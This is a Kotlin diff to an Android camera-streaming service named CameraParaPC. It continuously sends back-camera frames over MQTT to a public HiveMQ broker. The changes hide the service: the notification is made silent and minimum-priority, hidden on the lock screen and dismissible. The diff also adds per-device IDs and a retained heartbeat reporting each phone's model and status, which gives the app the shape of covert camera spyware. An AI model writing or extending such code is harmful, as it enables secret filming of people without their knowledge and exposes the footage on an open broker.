@@ -3,6 +3,7 @@ package com.venice.cameraparapc
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.content.Context
 import android.content.Intent
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
@@ -25,35 +26,66 @@ import org.eclipse.paho.client.mqttv3.MqttClient
 import org.eclipse.paho.client.mqttv3.MqttConnectOptions
 import org.eclipse.paho.client.mqttv3.MqttMessage
 import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
+import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.util.concurrent.Executors
 import java.util.concurrent.atomic.AtomicBoolean
+import kotlin.random.Random
 
 class CameraService : LifecycleService() {
 
     companion object {
-        private const val CANAL = "camstream"
+        private const val CANAL = "camstream_silencioso"
         private const val NOTIF_ID = 42
         private const val BROKER = "tcp://broker.hivemq.com:1883"
-        private const val TOPICO = "venice/cam/pc"
+        private const val PREFIXO = "camstream"
         private const val LARGURA_MAX = 640
         private const val INTERVALO_MS = 130L
+        private const val BATIDA_MS = 10000L
+
+        fun idDispositivo(ctx: Context): String {
+            val p = ctx.getSharedPreferences("camstream", Context.MODE_PRIVATE)
+            var id = p.getString("id", null)
+            if (id == null) {
+                val alfabeto = "abcdefghijklmnopqrstuvwxyz0123456789"
+                id = (1..6).map { alfabeto[Random.nextInt(alfabeto.length)] }.joinToString("")
+                p.edit().putString("id", id).apply()
+            }
+            return id
+        }
+
+        fun nomeDispositivo(): String {
+            val m = Build.MODEL
+            return if (m.isNullOrBlank()) "Celular" else m
+        }
     }
+
+    private lateinit var id: String
+    private lateinit var nome: String
+    private lateinit var topicoInfo: String
+    private lateinit var topicoFrame: String
 
     private val executor = Executors.newSingleThreadExecutor()
     private val ocupado = AtomicBoolean(false)
 
     @Volatile private var mqtt: MqttClient? = null
+    @Volatile private var rodando = true
     private var ultimoEnvio = 0L
     private var wakeLock: PowerManager.WakeLock? = null
 
     override fun onCreate() {
         super.onCreate()
+        id = idDispositivo(this)
+        nome = nomeDispositivo()
+        topicoInfo = "$PREFIXO/$id/info"
+        topicoFrame = "$PREFIXO/$id/frame"
+
         criarCanal()
         startForeground(NOTIF_ID, montarNotificacao())
         segurarCpu()
         iniciarCamera()
         conectarMqtt()
+        Thread { batidaLoop() }.start()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -62,21 +94,25 @@ class CameraService : LifecycleService() {
     }
 
     private fun criarCanal() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(
-                CANAL, "Transmissao da camera", NotificationManager.IMPORTANCE_LOW)
-            ch.setShowBadge(false)
-            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
-        }
+        val ch = NotificationChannel(
+            CANAL, "Transmissao silenciosa", NotificationManager.IMPORTANCE_MIN)
+        ch.setShowBadge(false)
+        ch.enableVibration(false)
+        ch.setSound(null, null)
+        ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
+        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
     }
 
     private fun montarNotificacao(): Notification =
         NotificationCompat.Builder(this, CANAL)
             .setContentTitle("CameraParaPC")
-            .setContentText("Transmitindo para o PC")
+            .setContentText("Transmitindo")
             .setSmallIcon(android.R.drawable.ic_menu_camera)
-            .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setOngoing(false)
+            .setSilent(true)
+            .setShowWhen(false)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
 
     private fun segurarCpu() {
@@ -101,7 +137,6 @@ class CameraService : LifecycleService() {
                 provider.unbindAll()
                 provider.bindToLifecycle(this, CameraSelector.DEFAULT_BACK_CAMERA, analise)
             } catch (e: Exception) {
-                // camera indisponivel
             }
         }, ContextCompat.getMainExecutor(this))
     }
@@ -109,20 +144,44 @@ class CameraService : LifecycleService() {
     private fun conectarMqtt() {
         Thread {
             try {
-                val id = "cam_" + System.currentTimeMillis()
-                val c = MqttClient(BROKER, id, MemoryPersistence())
+                val cid = "cam_" + id + "_" + System.currentTimeMillis()
+                val c = MqttClient(BROKER, cid, MemoryPersistence())
+                val lwt = JSONObject()
+                    .put("n", nome).put("t", 0L).put("off", true).toString()
                 val opt = MqttConnectOptions().apply {
                     isCleanSession = true
                     isAutomaticReconnect = true
                     connectionTimeout = 10
                     keepAliveInterval = 30
+                    setWill(topicoInfo, lwt.toByteArray(), 1, true)
                 }
                 c.connect(opt)
                 mqtt = c
+                publicarInfo(false)
             } catch (e: Exception) {
-                // offline, o automaticReconnect cuida
             }
         }.start()
+    }
+
+    private fun batidaLoop() {
+        while (rodando) {
+            try { publicarInfo(false) } catch (_: Exception) {}
+            try { Thread.sleep(BATIDA_MS) } catch (_: InterruptedException) {}
+        }
+    }
+
+    private fun publicarInfo(offline: Boolean) {
+        val c = mqtt ?: return
+        if (!c.isConnected) return
+        val json = JSONObject()
+            .put("n", nome)
+            .put("t", System.currentTimeMillis())
+            .put("off", offline)
+            .toString()
+        val m = MqttMessage(json.toByteArray())
+        m.qos = 1
+        m.isRetained = true
+        c.publish(topicoInfo, m)
     }
 
     private fun enviarFrame(image: ImageProxy) {
@@ -146,9 +205,8 @@ class CameraService : LifecycleService() {
             }
             val out = ByteArrayOutputStream()
             bmp.compress(Bitmap.CompressFormat.JPEG, 55, out)
-            publicar(Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP))
+            publicarFrame(Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP))
         } catch (e: Exception) {
-            // frame ruim, ignora
         } finally {
             image.close()
             ocupado.set(false)
@@ -171,16 +229,18 @@ class CameraService : LifecycleService() {
         return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
     }
 
-    private fun publicar(base64: String) {
+    private fun publicarFrame(base64: String) {
         val c = mqtt ?: return
         if (!c.isConnected) return
         val msg = MqttMessage(base64.toByteArray())
         msg.qos = 0
         msg.isRetained = true
-        c.publish(TOPICO, msg)
+        c.publish(topicoFrame, msg)
     }
 
     override fun onDestroy() {
+        rodando = false
+        try { publicarInfo(true) } catch (_: Exception) {}
         try { mqtt?.disconnect() } catch (_: Exception) {}
         try { mqtt?.close() } catch (_: Exception) {}
         try { wakeLock?.release() } catch (_: Exception) {}
